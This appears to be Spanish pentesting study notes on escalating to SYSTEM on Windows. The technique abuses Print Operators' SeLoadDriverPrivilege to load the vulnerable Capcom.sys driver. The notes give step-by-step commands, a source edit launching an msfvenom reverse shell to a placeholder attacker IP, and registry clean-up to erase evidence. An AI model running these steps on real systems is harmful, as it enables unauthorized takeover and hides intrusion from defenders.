---
tags:
  - windows
  - privex
  - capcomdotsys
---
## Conceptos Clave (TL;DR)

- El grupo **Print Operators** otorga `SeLoadDriverPrivilege`, permite gestionar/crear/compartir/eliminar impresoras en un DC, hacer logon local en el DC y apagarlo.
- `SeLoadDriverPrivilege` suele aparecer **deshabilitado** en un contexto no elevado; hay que saltar UAC o usar una herramienta que la habilite explícitamente.
- El driver **Capcom.sys** es vulnerable y permite a cualquier usuario ejecutar shellcode con privilegios **SYSTEM** una vez cargado.
- **GOTCHA CRÍTICO:** Desde **Windows 10 v1803** esta técnica ya no funciona, porque deja de ser posible referenciar claves de registro bajo `HKEY_CURRENT_USER` para la carga del driver.

## Herramientas Clave

| Herramienta | Propósito |
|---|---|
| `whoami /priv` | Enumerar privilegios del token actual |
| **UACMe** | Repositorio con bypasses de UAC desde línea de comandos |
| `EnableSeLoadDriverPrivilege.cpp/.exe` | PoC que habilita `SeLoadDriverPrivilege` y carga el driver |
| `cl.exe` (VS2019 Developer Command Prompt) | Compilar el código C++ de las PoCs |
| **Nirsoft DriverView.exe** | Verificar qué drivers están cargados en el sistema |
| **ExploitCapcom** | Exploit que abusa de Capcom.sys, roba el token y lanza shell SYSTEM |
| **EoPLoadDriver** | Automatiza: habilitar privilegio + crear clave de registro + cargar driver |
| `msfvenom` | Generar binario de reverse shell para sustituir el `cmd.exe` lanzado por ExploitCapcom |

## Metodología Paso a Paso

1. **Enumeración de privilegios**
   Ejecutar `whoami /priv` para comprobar si `SeLoadDriverPrivilege` aparece (y si está Enabled/Disabled). Si no aparece en absoluto, el contexto no es de Print Operators o falta elevación.

2. **Bypass de UAC (si aplica)**
   - Vía GUI: abrir una consola administrativa e introducir credenciales de una cuenta miembro de Print Operators.
   - Vía CLI: usar técnicas del repositorio UACMe.
   Tras esto, `SeLoadDriverPrivilege` debería aparecer listado, aunque en estado `Disabled`.

3. **Compilar la PoC de habilitación de privilegio**
   Descargar `EnableSeLoadDriverPrivilege.cpp`, sustituir los includes indicados y compilar con `cl.exe` desde una **Visual Studio 2019 Developer Command Prompt**.

4. **Preparar el driver vulnerable**
   Descargar `Capcom.sys` y copiarlo a una ruta local (ej. `C:\Tools\`).

5. **Crear referencia en el registro (HKCU)**
   Añadir las claves `ImagePath` y `Type` bajo `HKCU\System\CurrentControlSet\<NOMBRE_CLAVE>` apuntando al driver, usando sintaxis de **NT Object Path** (`\??\`).

6. **Verificar que el driver NO está cargado todavía**
   Usar `DriverView.exe` y filtrar por el nombre del driver.

7. **Habilitar el privilegio**
   Ejecutar el binario `EnableSeLoadDriverPrivilege.exe` compilado en el paso 3. Esto habilita `SeLoadDriverPrivilege` y carga el driver.

8. **Verificar que el privilegio quedó habilitado**
   Repetir `whoami /priv` y confirmar `SeLoadDriverPrivilege: Enabled`.

9. **Verificar que el driver SÍ está cargado**
   Repetir `DriverView.exe` y confirmar que aparece `Capcom.sys` con su ruta.

10. **Explotar el driver para obtener SYSTEM**
    Ejecutar `ExploitCapcom.exe` (compilado previamente con Visual Studio). Realiza token stealing y lanza una shell `NT AUTHORITY\SYSTEM`.

11. **Variante sin acceso GUI**
    Si no hay GUI disponible, modificar el código fuente de `ExploitCapcom.cpp` (función `LaunchShell`) para que en lugar de lanzar `cmd.exe` ejecute un binario de reverse shell generado con `msfvenom`. Recompilar y ejecutar. Si la reverse shell es bloqueada, probar con bind shell o payload exec/adduser.

12. **Automatización completa (alternativa a pasos 3-9)**
    Usar `EoPLoadDriver.exe` para automatizar en un solo comando: habilitar el privilegio, crear la clave de registro y cargar el driver vía `NTLoadDriver`. Después, igualmente ejecutar `ExploitCapcom.exe`.

13. **Limpieza (Clean-up)**
    Eliminar la clave de registro creada para borrar evidencia.

## Cheat Sheet de Comandos

```cmd
:: Enumerar privilegios del token actual (buscar SeLoadDriverPrivilege)
whoami /priv
```

```cmd
:: Compilar la PoC EnableSeLoadDriverPrivilege.cpp desde VS Developer Command Prompt
:: /D UNICODE y /D_UNICODE definen macros necesarias para compilar correctamente
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp
```

```cmd
:: Crear clave de registro bajo HKCU apuntando al driver malicioso
:: /v = nombre del valor, /t = tipo, /d = dato
:: \??\ es la sintaxis NT Object Path requerida para que el Win32 API resuelva la ruta
reg add HKCU\System\CurrentControlSet\<NOMBRE_CLAVE> /v ImagePath /t REG_SZ /d "\??\<RUTA_DRIVER>\Capcom.sys"

:: Definir el Type del driver (1 = SERVICE_KERNEL_DRIVER)
reg add HKCU\System\CurrentControlSet\<NOMBRE_CLAVE> /v Type /t REG_DWORD /d 1
```

```powershell
# Volcar lista de drivers cargados a un archivo de texto
.\DriverView.exe /stext drivers.txt

# Filtrar el archivo buscando el driver objetivo (ej. Capcom)
cat drivers.txt | Select-String -pattern Capcom
```

```cmd
:: Ejecutar la PoC que habilita SeLoadDriverPrivilege y carga el driver
<RUTA>\EnableSeLoadDriverPrivilege.exe
```

```powershell
# Ejecutar el exploit contra Capcom.sys -> roba token y lanza shell SYSTEM
.\ExploitCapcom.exe
```

```cmd
:: Automatizar todo el proceso (habilitar privilegio + crear reg key + cargar driver)
:: Sintaxis: EoPLoadDriver.exe <RUTA_REGISTRO_RELATIVA> <RUTA_ABSOLUTA_DRIVER>
EoPLoadDriver.exe System\CurrentControlSet\<NOMBRE_CLAVE> <RUTA_DRIVER>\Capcom.sys
```

```cmd
:: Limpieza - eliminar la clave de registro creada (cubrir huellas)
reg delete HKCU\System\CurrentControlSet\<NOMBRE_CLAVE>
```

```c
// Modificación del código fuente ExploitCapcom.cpp para entornos sin GUI
// Sustituir la línea original:
//   TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
// Por una ruta a un binario de reverse shell generado con msfvenom:
TCHAR CommandLine[] = TEXT("<RUTA_BINARIO_REVSHELL>");
```

```bash
# Generar binario de reverse shell con msfvenom para reemplazar el cmd.exe del exploit
# -p = payload, LHOST/LPORT = listener atacante, -f exe = formato de salida
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> -f exe -o revshell.exe
```

## "Gotchas" y Troubleshooting

- **Windows 10 v1803+ rompe la técnica por completo:** ya no se pueden referenciar claves de driver bajo `HKEY_CURRENT_USER`. Verificar versión de build del objetivo antes de invertir tiempo en este vector.
- `SeLoadDriverPrivilege` casi siempre aparece **Disabled** por defecto, incluso tras confirmarse la membresía en Print Operators; es obligatorio habilitarlo explícitamente (vía PoC o EoPLoadDriver), no basta con la membresía del grupo.
- Si `SeLoadDriverPrivilege` **no aparece en absoluto** en `whoami /priv` desde un contexto no elevado, es señal de que se necesita bypass de UAC antes de continuar.
- La compilación debe hacerse desde una **Visual Studio 2019 Developer Command Prompt** (no un cmd normal), de lo contrario `cl.exe` no estará en el PATH ni tendrá las variables de entorno correctas.
- La sintaxis `\??\` en `ImagePath` es obligatoria (NT Object Path); sin ella el Win32 API no resolverá correctamente la ruta del driver malicioso.
- Al ejecutar `EoPLoadDriver.exe` puede devolver un `NTSTATUS` distinto de éxito (ej. `c000010e`) aunque el flujo continúe funcionando; no asumir fallo total solo por ese código, verificar igualmente con `DriverView.exe` si el driver quedó cargado.
- Si la conexión de reverse shell es bloqueada por firewall/AV, tener como plan B un **bind shell** o un payload tipo **exec/adduser** en el binario sustituido dentro de `ExploitCapcom.cpp`.
- `ExploitCapcom.exe` debe compilarse también con Visual Studio antes de poder ejecutarse; no es un binario directamente descargable y listo.
- Como buena práctica de OPSEC, eliminar la clave de registro creada en `HKCU\System\CurrentControlSet\<NOMBRE_CLAVE>` tras finalizar la explotación.